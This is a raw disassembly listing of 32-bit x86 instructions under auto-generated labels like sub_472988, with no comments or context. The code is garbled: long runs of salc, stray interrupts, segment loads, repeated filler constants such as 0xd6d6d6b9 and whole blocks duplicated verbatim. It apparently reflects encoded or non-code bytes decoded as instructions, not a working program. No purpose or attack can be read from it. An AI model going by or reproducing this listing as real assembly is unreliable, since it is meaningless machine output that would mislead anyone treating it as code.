lds eax [ esp + eax * 2 - 0x3cbb513b ]
xchg [ ecx - 0x3e ] cl
pop ebp
inc esi
inc esi
inc esi
int 0x88
xchg [ edi - 0x784732bd ] esp
test eax 0x49894544
clc
jl r-xdata
inc esi
inc esi
iretd
mov [ ebp - 0x49 ] esi
add al 0xe
dec ecx
retn
sub_472988
or ebp [ edx ]
jne r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x2f
scasd [ edi ]
mov ecx 0xd6b9b99d
salc
int 0xf
jpe r-xdata
scasb [ edi ]
cmp ebx edi
mov ecx 0x86c31fb9
dec ecx
retn
mov ecx 0xcd19b9b9
sbb [ eax ] 0x85
salc
dec ecx
retn
adc [ esi ] dl
jge r-xdata
jbe r-xdata
dec esi
push ss
dec ecx
rol [ ebp + 0x46 ] 0x46
inc esi
iretd
inc esi
stc
or [ edx ] dh
inc esi
inc esi
and [ ebp - 0x77 ] bh
dec ecx
retn
mov ecx 0xb9d6d6b9
xor edi [ edx - 0x413a708b ]
mov ecx 0xcd87d349
mov bh 0xb9
xchg ebp eax
int 0x80
scasd [ edi ]
cmp eax [ ebx - 0x29294647 ]
salc
salc
salc
salc
pop ds
sub al 0x3f
scasd [ edi ]
out 0x48 eax
inc esi
inc esi
salc
and bh cl
adc ebp [ eax ]
iretd
sub_472996
sbb [ ecx + edi * 4 - 0x4bff5047 ] esi
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
inc ebx
inc edx
inc esi
inc esi
salc
salc
salc
salc
and bh cl
adc eax [ esi - 0x73c430e0 ]
and bh cl
or ecx [ edx - 0x4604f452 ]
mov ecx 0xb98e70af
mov ecx 0xb99226ae
mov ecx 0x566202cd
mov ecx 0x46c24376
inc esi
inc esi
push ss

sub_472a7c
sub [ edi - 0x464672bb ] 0xd6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
jg r-xdata
push es
scasd [ edi ]
test al 0xb9
mov ecx 0xd6d6d6d6
lds eax [ edx + 0x47b22e52 ]
inc esi
inc esi
mov ecx 0x32b94e11
bound ecx [ esi - 0x47 ]
adc [ edx + 0x2c ] ebp
inc esi
mov ecx 0x4646ead1
inc esi
sbb [ ebp + 0x4676462e ] eax
inc esi
push ss
adc [ edi - 0x4646557b ] ebp
salc
adc [ edi - 0x464641b6 ] ch
salc
salc
salc
salc
salc
pop ds
sub al 0x21
and bh cl
or ebx [ edi + ebp * 4 - 0x46467207 ]
salc
salc
salc
salc
salc
scasd [ edi ]
cdq
xchg ebx eax
mov ecx 0xd6d6d6b9
salc
salc
dec ecx
retn
dec edx
scasd [ edi ]
mov eax [ ss : 0xffffffffd6d6b9b9 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
mov eax [ 0x10b9b995 ]
mov bh 0x5b
das
sub_472b76
sbb bh [ ebx + 0x7516b9b9 ]
mov al 0xaf
inc ecx
std
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
sub al 0x22
mov ecx 0x97af4e11
std
mov ecx 0xc3cbd6b9
0xb9bb
sub_472ba0
adc ebp [ esi - 0x46032e51 ]
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xbbc6c3cb
mov ecx 0xb91516b9
adc [ esi ] edx
retn
sub_472c3a
adc ebx [ eax ]
scasd [ edi ]
mov [ 0x20b9b9fd ] eax
lds edi [ 0xffffffffc2494600 ]
into
xchg ebx eax
mov ecx 0x623ac5b9
push edx
inc esi
scasd [ edi ]
xchg ebx eax
mov ecx 0xd6d6d6b9
int 0x3
mov esi 0x17a60bcb
mov ecx 0x4dafba36
xchg ebx eax
mov ecx 0x4af06b9
movsd [ edi ] [ esi ]
mov ecx 0x49d6d6b9
sar [ esi + 0x2db9b9f8 ] 0x86
dec esp
scasd [ edi ]
bound edx [ edx - 0x29294647 ]

sub_472cc6
add edi [ esi + 0x16b203cb ]
sub al 0xb9
mov ecx 0xecafaa33
xchg ecx eax
mov ecx 0xb9d6d6b9
xor esp [ edx + 0x155a11b9 ]
mov ecx 0xd1b9ae33
fiadd [ esi + 0x46 ]
inc esi
jg r-xdata
xchg [ ecx - 0x29292947 ] edi
salc
salc
adc ecx ebp
stosb [ edi ]
dec edx
dec ecx
retn 0xb598
sub_472d12
push 0x44
inc esi
inc esi
adc eax 0x462e422c
salc
pop ds
scasd [ edi ]
jbe r-xdata
inc esi
xchg esi eax
inc edi
inc edi
inc esi
jne r-xdata
jbe r-xdata
inc edx
inc esi
mov ecx 0xd6d6d6b9
salc
salc
add [ ebx ] 0x2c462cb3
inc esi
and [ ecx - 0x694640fd ] al
iretd
add [ esi ] dl
push ss
iretd
adc eax 0xb9a6f7af
mov ecx 0xd0b911d6
rol [ esi + 0x46 ] cl
inc esi
iretd
sub_472d5a
mov ecx 0xf0af1fb9
cwde
mov ecx 0x1fd6d6b9
inc edx
inc esi
jbe r-xdata
mov ecx 0xd6d6d6b9
salc
salc
add [ ebx ] 0x2c462cb3
inc esi
and [ ecx - 0x694640fd ] al
iretd
scasd [ edi ]
jbe r-xdata
salc
pop ds
inc esi
xchg esi eax
inc edi
inc edi
inc esi
jne r-xdata
add [ esi ] dl
push ss
iretd
adc eax 0xb9a6f7af
mov ecx 0xd0b911d6
rol [ esi + 0x46 ] cl
inc esi
iretd
sub_472d93
inc ecx
inc esi
inc esi
inc esi
adc eax 0x46ead0b9
inc esi
inc esi
adc [ 0x5e6232b9 ] edx
scasb [ edi ]
scasb [ edi ]
xchg esi eax
mov ecx 0x8c48afb9
mov ecx 0xd6d6d6b9
salc
salc
adc [ edx + eax * 2 ] ebp
inc esi
jbe r-xdata

inc esi
mov ecx 0x462c4a33
scasd [ edi ]
ror [ eax + 0x46 ] 0x46
salc
salc
salc
salc
salc
salc
scasd [ edi ]
adc [ ecx + edi * 4 - 0x29292947 ] 0xd6
salc
dec ecx
retn 0xa1dd
sub_472dd9
mov ecx 0xa1caafb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc

sub_472e01
add ebp esi
scasd [ edi ]
mov esi 0xd6b9b9be
salc
int 0x3
dec esi
add [ ebx ] 0x2f2435b2
and eax [ ecx + 0x2a22be03 ]
sub ch [ eax - 0x7f ]
add edi [ edx + 0x462a2a22 ]
mov ecx 0x9eb13e16
pop ebp
xchg [ ecx - 0x297a7062 ] dh
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasd [ edi ]
push eax
mov bl 0xb9
mov ecx 0xd6d6d6d6
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc

sub_472e85
xchg [ edi - 0x46464909 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
test eax 0x2eb9b992
mov esi 0x110f798a
iretd
sub_472ea3
add [ edx - 0x52 ] al
cmpsd [ esi ] [ edi ]
xchg edx eax
mov ecx 0xc1262eb9
loope r-xdata
mov edx 0xb233b917
scasd [ edi ]
inc eax
mov edi 0xd6d6b9b9
retn
adc [ edi - 0x46467b92 ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
int1
add [ eax - 0x47 ] al
add edi [ esi + 0x6eba03c5 ]
pop ds
pop ds
scasd [ edi ]
push esp
sti
mov ecx 0x16d6d6b9
mov ecx 0xbec52210
mov ecx 0xf99dc349
mov ecx 0xcb472cb9
add ah [ edx + 0x69 ]
push ss

sub_472eee
inc esi
inc esi
inc esi
push ss
add [ edx ] 0x62
jno r-xdata
salc
salc
sbb [ eax ] esp
iretd
scasb [ edi ]
or edi eax
mov ecx 0xbed0afb9
mov ecx 0xd6d6d6b9
salc
int 0x9e
scasd [ edi ]
mov [ ebp - 0x29294647 ] 0xc34994c3
loop r-xdata
add edi [ edx - 0x50e0e092 ]
push esp
sti
mov ecx 0x16d6d6b9
mov ecx 0xbec52210
mov ecx 0xf99dc349
mov ecx 0xcb472cb9
add ah [ edx + 0x69 ]
push ss

mov ecx 0xb6daafb9
mov ecx 0xcbd6d6b9
or edi [ edx - 0x4dcc46e9 ]
scasd [ edi ]
inc eax
mov edi 0xd6d6b9b9
retn
sub_472f3e
add [ edx ] al
scasb [ edi ]
add [ edx - 0x7d3a4647 ] dl
push es
scasd [ edi ]
sub dl [ edx - 0x29294647 ]
and bh cl
cmp esi esp
int 0xbc
sub al 0x3e
and bh cl
cmp esi edx
sbb [ eax ] esp
iretd
sub_472f72
cmp ebp [ edi + ebp * 4 - 0x46466f1f ]
salc
salc
salc
salc
salc
salc
mov ecx 0x33afbe33
movsb [ edi ] [ esi ]
mov ecx 0xd6d6d6b9
salc
dec ecx
retn 0x9ead
sub_473032
mov [ esi + eax * 2 + 0x46 ] 0x15
adc [ edx + eax ] ch
jne r-xdata
salc
salc
salc
salc
salc
salc
salc
adc [ edi - 0x46464346 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sbb [ eax ] ebx
pop [ ebp - 0x2929292a ]
salc
salc
and bh cl
adc ebx edx
scasd [ edi ]
pushfd
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
mov ecx 0x33b91230
dec esi
scasd [ edi ]
mov edx 0xd6b9b983
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ecx ebp
stosb [ edi ]
scasd [ edi ]
mov dh bh
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
scasb [ edi ]
in eax dx
clc
mov ecx 0x71ae16b9
xchg ebp eax
mov ecx 0xcb1f1fb9
or ebx [ esi - 0x46f9d3e9 ]
xor [ esi ] dl
iretd
sub_473060
sbb ebx [ esi - 0x4645cc47 ]
xor esp [ edx + 0x422c96b9 ]
inc esi
jbe r-xdata
nop
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x96
and bh cl
adc ebx [ esp + ebx - 0x30dfc9d4 ]
adc ebx [ edx + 0x202a2c1c ]
iretd
inc esi
mov ecx 0xd4af1630
dec esp
inc esi
inc esi
salc
salc
salc
salc
salc
dec ecx
retn 0xa124
sub_473082
mov ecx 0x27eef9b9
inc esi
inc esi
scasd [ edi ]
inc ebp
sti
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
push ss
scasd [ edi ]
popad
nop
mov ecx 0x2cd6d6b9
sub bl [ eax ]
iretd
sub_4730b0
adc esi [ esi + 0x2c ]
aas
scasd [ edi ]
test al 0x90
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
int 0x96
and bh cl
adc ebx [ esp + ebx - 0x30dfc9d4 ]
adc ebx [ edx + 0x202a2c1c ]
iretd
sub_47318a
inc eax
adc [ edi - 0x4646613f ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0x2f5bb72e
push es
mov ecx 0x464682f0
inc esi
int 0xb8
scasb [ edi ]
push ebx
cmpsb [ esi ] [ edi ]
mov ecx 0xa9c9afb9
mov ecx 0xd6d6d6b9
salc
sub al 0x42

sub_473217
add ah [ edx + 0x72 ]
jg r-xdata
and bh cl
adc esp [ edx - 0x30df6833 ]
adc edi esi
int 0x96
scasd [ edi ]
stc
inc eax
inc esi
inc esi
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edx + 0x4986c352 ]
retn 0x4d3d
bound esi [ esi + 0x49 ]
retn 0xb568
sub_4732b1
fcom [ ebx + 0x462cb9b9 ]
mov ecx 0x4646ead0
inc esi
sbb [ eax ] ebx
sbb eax 0xb9faacaf
mov ecx 0xbac0cfd6
inc esi
inc esi
inc esi
scasb [ edi ]
cld
xchg esi eax
mov ecx 0x74ab2eb9
inc eax
test al 0x15
iretd
sub_473371
mov ecx 0x1f692eb9
mov [ 0xffffffffd8cf15d8 ] eax
xchg esi eax
inc esi
inc esi
inc esi
scasb [ edi ]
inc ecx
xchg esi eax
mov ecx 0x10372eb9
div [ esi + 0x15 ]
scasd [ edi ]
stosd [ edi ]
xchg ecx eax
mov ecx 0xc249d6b9
pop es
cmpsb [ esi ] [ edi ]
mov ecx 0x727f20b9
push edi
scasd [ edi ]
pop eax
movsd [ edi ] [ esi ]
mov ecx 0x1fd6d6b9
retn
sub_4733a3
xchg [ ecx - 0x3e ] cl
adc eax [ ebx - 0x46ea4647 ]
shr dl 0x1
inc esi
inc esi
inc esi
mov ecx 0xaf464646
xor [ ebp - 0x29294647 ] al
salc
salc
salc
dec ecx
int1
push edi
scasd [ edi ]
dec ebp
test eax 0xd6d6b9b9

sub_4733fe
add eax esi
scasd [ edi ]
sub [ ecx + edi * 4 + 0x1e302cb9 ] esp
sub al 0x2b
and bh cl
add ecx [ edx + 0x1c292c1e ]
sub al 0x33
scasd [ edi ]
mov [ es : ecx - 0x29292947 ] bh
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
mov ecx 0xf7af1611
mov ebp 0xd6d6b9b9
salc

sub_473478
add [ esi - 0x52 ] ah
dec edx
mov [ ecx - 0x62e15047 ] edi
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
add edx [ esi + ebx + 0x2c ]
xor [ eax ] ah
iretd
sub_473503
xchg [ edi - 0x46464c47 ] ch
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x23
sbb eax 0xb603cf20
sub al 0x34
int 0x85
and bh cl
add esi [ esi + ebx + 0x2018352c ]
iretd
sub_4735a9
mov ecx 0xf995c249
mov ecx 0x2e422cb9
inc esi
jbe r-xdata
mov ecx 0x45d6d6d6
mov dh 0xc7
js r-xdata
inc esi
scasd [ edi ]
lea ecx [ esi - 0x29294647 ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
retn 0xa744
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
add eax [ esi + 0x46 ]
scasd [ edi ]
push edi
mov ecx 0x5d9eb1b9
xchg [ esi ] al
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ebp [ edi - 0x4646596d ]
and bh cl
sbb edi esi
int 0x9c
push ss
int 0x80
and bh cl
sbb edi edx
scasd [ edi ]
push ss
mov ch 0xb9
mov ecx 0xcfd6d6d6
add edi [ esi + 0x464646fe ]
inc esi
dec ecx
in al 0xaf
sub [ ebp - 0x29294647 ] bl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xc3cb1515
cli
mov esp 0xcb16b9b9
add edx [ esi - 0x2f46eaea ]
mov [ 0xffffffffaf464646 ] al
stc
xchg ebp eax
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
sub al 0x47
and bh cl
add ah [ edx + 0x4 ]
jne r-xdata
push ss
push ss

sub_4735ef
add edx [ edx - 0x51 ]
popad
idiv [ ecx - 0x50e02947 ]
inc esp
mov edi [ ecx - 0x29292947 ]
inc ebp
mov dh 0xc7
js r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
add eax [ esi + 0x46 ]
scasd [ edi ]
push edi
mov ecx 0x5d9eb1b9
xchg [ esi ] al
pop [ ebp - 0x2929292a ]
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ebp [ edi - 0x4646596d ]
and bh cl
sbb edi esi
int 0x9c
push ss
int 0x80
and bh cl
sbb edi edx
scasd [ edi ]
push ss
mov ch 0xb9
mov ecx 0xcfd6d6d6
add edi [ esi + 0x464646fe ]
inc esi
dec ecx
in al 0xaf
sub [ ebp - 0x29294647 ] bl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xc3cb1515
cli
mov esp 0xcb16b9b9
add edx [ esi - 0x2f46eaea ]
mov [ 0xffffffffaf464646 ] al
stc
xchg ebp eax
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
sub al 0x47
and bh cl
add ah [ edx + 0x4 ]
jne r-xdata
push ss
push ss

sub_4736cd
mov ecx 0x818caeb9
mov ecx 0x4e0bcdb9
scasd [ edi ]
daa
mov ah 0xb9
mov ecx 0x8675d6d6
sbb [ edi - 0x2929297b ] cl
salc
salc
salc
salc
salc
salc
sbb [ edi - 0x46460726 ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x66
and bh cl
add esi [ esi - 0x46709551 ]
mov ecx 0xbdaf8675
cld
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
dec ecx
int1
push edi
and bh cl
push esi
and bl al
xchg esp eax
scasd [ edi ]
jge r-xdata
mov ecx 0xd6d6d6b9
lds edi [ ebp - 0x71145047 ]
mov ecx 0xd6d6d6b9
salc
and bh cl
add edx [ eax - 0x4df430e0 ]
sub al 0x23
push ds
sub al 0x2a
and bh cl
add esi [ eax - 0x50dfd3e2 ]
sub_47376e
mov ecx 0xb9a91bae
mov ecx 0x9120af1f
mov ecx 0xd6d6d6b9
sub al 0x23
push ds
and bh cl
add edi [ esi - 0x50e1c1d4 ]
mov cl 0xa4
mov ecx 0xc249d6b9
js r-xdata
scasd [ edi ]
jmp r-xdata
mov ecx 0x422c15b9

salc
salc
salc
jge r-xdata
mov ecx 0x1bcf20b9
dec ch
pushfd
dec ecx
retn 0xb4c7
push ss
int 0x80
and bh cl
sbb edi edx
scasd [ edi ]
push ss
mov ch 0xb9
mov ecx 0xcfd6d6d6
add edi [ esi + 0x464646fe ]
inc esi
dec ecx
in al 0xaf
sub [ ebp - 0x29294647 ] bl
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc eax 0xc3cb1515
cli
mov esp 0xcb16b9b9
add edx [ esi - 0x2f46eaea ]
mov [ 0xffffffffaf464646 ] al
stc
xchg ebp eax
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
sub al 0x47
and bh cl
add ah [ edx + 0x4 ]
jne r-xdata
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
adc ebp [ edi - 0x4646596d ]
and bh cl
sbb edi esi
int 0x9c
push ss
push ss

sub_473797
add ebx [ edx - 0x41fc32ea ]
int 0xc6
loop r-xdata
inc esi
inc esi
inc esi
scasb [ edi ]
fiadd [ edi + 0x46 ]
inc esi
lds edi [ esi - 0x7c3db6b9 ]
mov esp 0x1a67b9b9
bound edx [ esi - 0x35 ]
add ah [ edx + 0x56 ]
push ss
sub al 0x40
scasb [ edi ]
inc ebp
inc esi
inc esi
int 0x80
scasb [ edi ]
test al 0x97
mov ecx 0xb0b7afb9
mov ecx 0xd6d6d6b9
salc
salc
iretd
inc esi
inc esi
lds eax [ esi + 0x33b9164e ]
mov [ 0xffffffffb9f336af ] al
mov ecx 0xcf20d6d6
cmp ecx [ ecx + ebx - 0x30dffbd4 ]
adc ebx esi
and bh cl
cmp edx edx
scasd [ edi ]
jb r-xdata
add al 0x20
iretd
mov ecx 0x5603cbb9
push ss
inc eax
inc esi
inc esp
inc esi
adc eax 0xb9af42af
mov ecx 0xfac6aed6
mov ecx 0x47bec5b9
dec ecx
retn
sub_4737df
inc ecx
inc esi
inc esi
inc esi
adc eax 0x46ead0b9
inc esi
inc esi
scasb [ edi ]
fiadd [ edi + 0x46 ]
inc esi
lds edi [ esi - 0x7c3db6b9 ]
mov esp 0x1a67b9b9
bound edx [ esi - 0x35 ]
add ah [ edx + 0x56 ]
push ss
sub al 0x40
scasb [ edi ]
inc ebp
inc esi
inc esi
int 0x80
scasb [ edi ]
test al 0x97
mov ecx 0xb0b7afb9
mov ecx 0xd6d6d6b9
salc
salc
iretd
sub_47381a
add edi [ edx - 0x46419151 ]
mov ecx 0x3cf20d6
xchg edx eax
int 0x80
and bh cl
add edx [ eax - 0x466c9b51 ]
mov ecx 0xcf20302c
adc eax [ edx - 0x30df6b8b ]
adc eax [ eax - 0x50d0d3e4 ]
mov eax [ 0xffffffffd6b9b98b ]
salc
salc
mov ecx 0x52ce4a0b
inc edi
push es
scasd [ edi ]
[ edx - 0x29294647 ]
sub_473856
salc
salc
salc
salc
salc
sub al 0x21
sbb [ edi - 0x46465fe6 ] ebp
salc
salc
salc
int 0x5
push esi
retn
sub_473885
fiadd [ esi + 0x46 ]
inc esi
adc eax 0x362c1110
sbb [ edi - 0x46466fdb ] ebp
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
lds eax [ edi + 0x4484c544 ]
and bl al
xchg [ ecx - 0x3e ] cl
sti
sti
mov ecx 0x44f149b9
scasd [ edi ]
0xd6b9b982 0xb9d6
xor ecx [ edx - 0x47 ]
xor ecx [ esi - 0x51 ]
sub al 0xb2
mov ecx 0xd6d6d6b9
salc
salc
salc
push es
scasd [ edi ]
mov [ ecx + edi * 4 - 0x29292947 ] ecx
salc
salc
salc
salc
salc
salc

sub_47395d
or ebp [ esi - 0x2d50ebe1 ]
std
mov ecx 0x5287c5b9
scasd [ edi ]
jb r-xdata
sub al 0x25
and bh cl
sbb ecx [ esi ]
sbb eax 0xc1bcf20
int 0x9e
and bh cl
sbb ecx [ edx ]
int 0x9f
and bh cl
sbb ecx [ eax ]
int 0x99
and bh cl
sbb edx [ esi ]
sub al 0x34
int 0x98
and bh cl
sbb edx [ ecx * 8 + 0x1bcf209e ]
adc cl ch
lahf
and bh cl
sbb edx [ eax ]
int 0x9e
and bh cl
sbb ebx [ esi ]
jne r-xdata
inc esi
inc esi
pop ds
pop ds
retn
salc
salc
salc
adc ebp [ edi - 0x4646710e ]
salc
jne r-xdata
and bh cl
sbb ebx [ ecx * 8 - 0x76815067 ]
mov ecx 0xc349d6b9
xor edx 0xffffffb9
mov ecx 0x475a39c5
dec ecx
retn
cmpsb [ gs : esi ] [ edi ]
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
adc edi esp
sbb al 0xaf
0xb9b9b9f8 0x5e11
scasd [ edi ]
jo r-xdata
and bh cl
add ebp [ ebx + ecx * 8 - 0x4643053d ]
mov ecx 0x68af1116
xchg esp eax
mov ecx 0x1bcf20b9
add ch [ esp + esi ]
sbb eax 0x1bcf20
int 0x9c
xor ecx [ edx - 0x47 ]
xor ecx [ esi - 0x51 ]
sub al 0xb2
mov ecx 0xd6d6d6b9
salc
salc
salc
push es
scasd [ edi ]
mov [ ecx + edi * 4 - 0x29292947 ] ecx
salc
salc
salc
salc
salc
salc

mov ecx 0xf149d6b9
dec esi
scasd [ edi ]
0xb99d
sub_473971
xchg [ ecx - 0x3e ] cl
cmp eax 0xafb9b986
sub [ esi - 0x29294647 ] al
salc
salc
salc
salc
salc
cmpsb [ gs : esi ] [ edi ]
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
adc edi esp
sbb al 0xaf
0xb9b9b9f8 0x5e11
scasd [ edi ]
jo r-xdata
and bh cl
add ebp [ ebx + ecx * 8 - 0x4643053d ]
mov ecx 0x68af1116
xchg esp eax
mov ecx 0x1bcf20b9
add ch [ esp + esi ]
sbb eax 0x1bcf20
int 0x9c
sub al 0x25
and bh cl
sbb ecx [ esi ]
sbb eax 0xc1bcf20
int 0x9e
and bh cl
sbb ecx [ edx ]
int 0x9f
and bh cl
sbb ecx [ eax ]
int 0x99
and bh cl
sbb edx [ esi ]
sub al 0x34
int 0x98
and bh cl
sbb edx [ ecx * 8 + 0x1bcf209e ]
adc cl ch
lahf
and bh cl
sbb edx [ eax ]
int 0x9e
and bh cl
sbb ebx [ esi ]
jne r-xdata
xor ecx [ edx - 0x47 ]
xor ecx [ esi - 0x51 ]
sub al 0xb2
mov ecx 0xd6d6d6b9
salc
salc
salc
push es
scasd [ edi ]
mov [ ecx + edi * 4 - 0x29292947 ] ecx
salc
salc
salc
salc
salc
salc

mov ecx 0xf149d6b9
dec esi
scasd [ edi ]
0xb99d
salc
salc
salc
adc ebp [ edi - 0x4646710e ]
salc
jne r-xdata
and bh cl
sbb ebx [ ecx * 8 - 0x76815067 ]
mov ecx 0xc349d6b9
xor edx 0xffffffb9
mov ecx 0x475a39c5
dec ecx
retn
sub_473a48
add esp [ esi + ebx - 0x30dfd8d4 ]
add esp [ edx - 0x50cdd3e2 ]
0xd6b9b9e8 0xbeaf
idiv [ ecx - 0x29292947 ]
salc
salc
salc
salc
salc
salc
salc
salc
sub al 0x6
scasd [ edi ]
js r-xdata
push ss
scasd [ edi ]
inc esi
scasd [ edi ]
mov ecx 0xd6d6d6b9
salc
push ss
pop ss
sub al 0x47
sub al 0x46
mov ecx 0xb9526232
jo r-xdata
mov ecx 0xd6d6d6b9
and bh cl
add ebx [ eax - 0x5097d3e2 ]
stc
mov ecx 0xd6d6b9b9
jg r-xdata
lahf
and bh cl
sbb edx [ eax ]
int 0x9e
and bh cl
sbb ebx [ esi ]
jne r-xdata
sar [ edx - 0x50b9b9ba ] 0x1
in al dx
test [ ecx + 0xcf11b9 ] edi
adc ch [ esi - 0x464670ef ]
scasd [ edi ]
push eax
lodsb [ esi ]
mov ecx 0xd6d6d6b9
salc
salc
salc
and bh cl
add esp [ esi + 0x20242c1e ]
iretd
iretd
bound esp [ esi + 0x49 ]
retn 0x8eff
salc
salc
salc
adc ebp [ edi - 0x4646710e ]
salc
jne r-xdata
and bh cl
sbb ebx [ ecx * 8 - 0x76815067 ]
mov ecx 0xc349d6b9
xor edx 0xffffffb9
mov ecx 0x475a39c5
dec ecx
retn
cmpsb [ gs : esi ] [ edi ]
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
and bh cl
adc edi esp
sbb al 0xaf
0xb9b9b9f8 0x5e11
scasd [ edi ]
jo r-xdata
and bh cl
add ebp [ ebx + ecx * 8 - 0x4643053d ]
mov ecx 0x68af1116
xchg esp eax
mov ecx 0x1bcf20b9
add ch [ esp + esi ]
sbb eax 0x1bcf20
int 0x9c
sub al 0x25
and bh cl
sbb ecx [ esi ]
sbb eax 0xc1bcf20
int 0x9e
and bh cl
sbb ecx [ edx ]
int 0x9f
and bh cl
sbb ecx [ eax ]
int 0x99
and bh cl
sbb edx [ esi ]
sub al 0x34
int 0x98
and bh cl
sbb edx [ ecx * 8 + 0x1bcf209e ]
adc cl ch
xor ecx [ edx - 0x47 ]
xor ecx [ esi - 0x51 ]
sub al 0xb2
mov ecx 0xd6d6d6b9
salc
salc
salc
push es
scasd [ edi ]
mov [ ecx + edi * 4 - 0x29292947 ] ecx
salc
salc
salc
salc
salc
salc

mov ecx 0xf149d6b9
dec esi
scasd [ edi ]
0xb99d
sub_473b5f
inc esi
inc esi
jne r-xdata
adc ebx [ edx - 0x467a8d52 ]
mov ecx 0x16b903cb
add [ ebx ] 0xb9
inc esi
scasd [ edi ]
shl ebx cl
mov ecx 0xd6d6d6b9
salc
salc
adc eax 0xb9fa7eaf
mov ecx 0xd6d6d6d6
mov ecx 0x4646eed1
inc esi
scasd [ edi ]
inc edx
xchg [ ecx + 0xbaed6b9 ] bh
clc
mov ecx 0xed59afb9
mov ecx 0x1bcf16b9
mov edx 0xb9851bae
mov ecx 0x154a82c5
scasd [ edi ]
[ edi ] [ esi ]
mov ecx 0x13d6d6b9
int 0xaa
lds ebp [ edx - 0x493f32ae ]
inc esi
inc esi
inc esi
adc eax 0xb9877faf
mov ecx 0xaed6d6d6
aad 0xa8
mov ecx 0x4986c3b9
retn 0x4643
and bh cl
dec esi
test esi edx
salc
salc
salc
salc
salc
salc
sub al 0x21
int 0x84
and bh cl
add edx [ edx - 0x30df7833 ]
add edx [ eax - 0x50cad3e2 ]
outsd
cmp [ ecx - 0x29292947 ] 0xffffffd6
salc
salc
salc
salc
salc
salc
salc
salc
scasb [ edi ]
int3
sub_473c7c
mov ecx 0xac5eafb9
mov ecx 0xd6d6d6b9
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
salc
iretd
sub_473cc8
mov ecx 0xce04d6b9
sbb dl [ ebx - 0x1b ]
lds edi [ eax + 0x3c44966 ]
xchg ecx eax
mov ecx 0xba03b9b9
lds edi [ ebx ]
mov edx 0x41c44945
